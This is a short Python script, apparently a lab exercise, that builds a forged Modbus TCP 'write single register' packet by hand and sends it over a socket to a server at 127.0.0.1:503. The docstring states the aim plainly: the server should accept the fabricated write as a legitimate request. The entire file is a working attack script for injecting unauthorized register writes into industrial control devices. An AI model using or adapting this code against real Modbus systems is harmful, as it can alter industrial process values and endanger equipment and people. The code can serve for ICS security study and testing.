from scapy.all import *
import socket

def fabricate_modbus_write(server_ip="127.0.0.1", server_port=503):
    '''
    In this function, the intention is to create a fake modbus TCP packet and send it to the server 
    in a way that the server will interpret it as a legitimate request.
    '''
    # Construction of a fake Modbus TCP packet
    transaction_id = b'\x12\x34'  # random transaction ID
    protocol_id = b'\x00\x00'  # Protocol ID (Always 0 for Modbus TCP)
    length = b'\x00\x06' 
    unit_id = b'\x01'  # Slave identifier 
    function_code = b'\x06'  # function code 6 represent "write single register"
    register_address = b'\x00\x01'  # address of the register to write to
    register_value = b'\x05\x39'  # Value to write into the register (0x0539 = 1337 in decimal)

    modbus_fabrication = transaction_id + protocol_id + length + unit_id + function_code + register_address + register_value

    # Creation of a socket to send the packet to the server
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # INET for IPv4, SOCK_STREAM for TCP connection
        sock.connect((server_ip, server_port)) # Connect to the server
        sock.send(modbus_fabrication)

        response = sock.recv(1024)  
        sock.close()
    except Exception as e:
        print(f"Error during the communication: {e}")
        response = None

    return response

print(fabricate_modbus_write())
